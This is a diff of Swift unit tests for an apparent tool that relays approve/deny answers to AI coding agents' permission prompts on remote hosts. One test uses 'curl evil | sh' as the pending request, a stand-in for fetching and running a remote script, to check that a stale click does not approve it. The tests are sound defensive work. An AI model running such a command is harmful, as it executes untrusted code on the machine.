@@ -556,7 +556,7 @@ struct RemoteAnswerTests {
     }
 
     @Test func remoteAntigravityWalksByLabel() async throws {
-        let rig = Rig(replies: ["capture": #"{"text":"Allow creation of this file?\n> 1. Approve\n  2. Deny"}"#,
+        let rig = Rig(replies: ["capture": #"{"text":"Allow creation of this file?\n> 1. Approve\n  2. Deny\n\n  ↑/↓ Navigate · enter Select"}"#,
                                 "keys": #"{"sent":true}"#])
         rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "agy"))
         let agy = AgentSession(
@@ -572,7 +572,36 @@ struct RemoteAnswerTests {
         ]))
         #expect(calls[1].arguments["pid"] == .int(4242))
         #expect(calls[1].arguments["comm"] == .string("agy"))
-        #expect(rig.store.sessions.first?.status == .working(activity: "Rethinking after deny…"))
+        #expect(rig.store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: false, tool: .antigravity))))
+    }
+
+    /// A list the model wrote is not agy's gate, remotely as on this Mac:
+    /// nothing is pressed.
+    @Test func remoteAntigravityRefusesAModelWrittenList() async throws {
+        let rig = Rig(replies: ["capture": #"{"text":"Steps:\n> 1. Approve\n  2. Deny\n\n> Type a message"}"#,
+                                "keys": #"{"sent":true}"#])
+        rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "agy"))
+        let agy = AgentSession(
+            tool: .antigravity, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+            status: .waitingApproval(command: "write a.txt"), pid: 4242, host: "devbox")
+        rig.store.upsert(agy)
+        #expect(await rig.supervisor.performAnswer(agy, allow: true) == false)
+        #expect(await rig.helper.calls.map(\.command) == ["capture"])
+    }
+
+    /// The row a click came from is a snapshot behind. When the store now
+    /// holds another request for the session, the old click presses nothing.
+    @Test func aClickOnAStaleRowPressesNothing() async throws {
+        let rig = Rig(replies: ["capture": #"{"text":"1. Approve once\n2. Reject"}"#,
+                                "keys": #"{"sent":true}"#])
+        rig.land(try Self.snapshot(pid: 4242, pane: Self.pane))
+        let shown = kimi()
+        var current = shown
+        current.status = .waitingApproval(command: "curl evil | sh")
+        rig.store.upsert(current)
+        #expect(await rig.supervisor.performAnswer(shown, allow: true) == false)
+        #expect(!(await rig.helper.calls.map(\.command).contains("keys")))
     }
 
     @Test func keystrokeTogglesOffMeanTerminalOnly() async throws {
@@ -693,7 +722,14 @@ struct RemoteAnswerTests {
         let session = kimi()
         rig.store.upsert(session)
         #expect(await rig.supervisor.performAnswer(session, allow: false))
-        #expect(rig.store.sessions.first?.status == .working(activity: "Rethinking after deny…"))
+        // Held as sent until the host's state moves past the prompt: the
+        // next snapshot can still describe it, and a second click must not
+        // answer whatever the agent drew next.
+        #expect(rig.store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: false, tool: session.tool))))
+        rig.store.approve(session)
+        rig.store.deny(session)
+        #expect(await rig.helper.calls.map(\.command) == ["capture", "keys"])
     }
 
     // MARK: - Inline reply
@@ -1101,7 +1137,8 @@ struct RemoteAnswerTests {
         #expect(store.sessions.first?.status == .waitingApproval(command: "git push --force"))
 
         store.noteRemoteAnswerSent(newer, allow: true)
-        #expect(store.sessions.first?.status == .runningTool(activity: "Running git"))
+        #expect(store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: newer.tool))))
     }
 
     @Test func terminalOnlyNoteNamesTheHost() {
